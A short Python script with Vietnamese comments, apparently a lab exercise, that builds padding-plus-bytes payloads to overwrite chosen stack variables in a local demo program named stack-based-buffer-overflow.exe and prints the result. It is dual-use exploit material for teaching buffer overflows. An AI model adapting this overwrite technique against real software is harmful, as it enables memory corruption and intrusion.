import sys
import subprocess
# Chọn mục tiêu ghi đè
target = input("Chọn mục tiêu ghi đè (1: str, 2: second_var, 3: first_var): ")

# Tạo chuỗi payload theo lựa chọn
if target == "1":
    payload = b'A' * 10 + bytes.fromhex('99 11')  # 2 byte ghi đè lên str
elif target == "2":
    payload = b'A' * 12  + bytes.fromhex('dd cc bb aa')  # 4 byte ghi đè lên second_var
elif target == "3":
    payload = b'A' * 16  + bytes.fromhex('99 11 33 22')  # 4 byte ghi đè lên first_var
else:
    print("Lựa chọn không hợp lệ.")
    sys.exit(1)

print(f"Payload (Hex): {payload.hex()}")

# Chạy chương trình với payload
try:
    result = subprocess.run(
        ["stack-based-buffer-overflow.exe"], input=payload, text=False, capture_output=True
    )
    print("Output:")
    print(result.stdout.decode())
except Exception as e:
    print(f"Lỗi khi chạy khai thác: {e}")
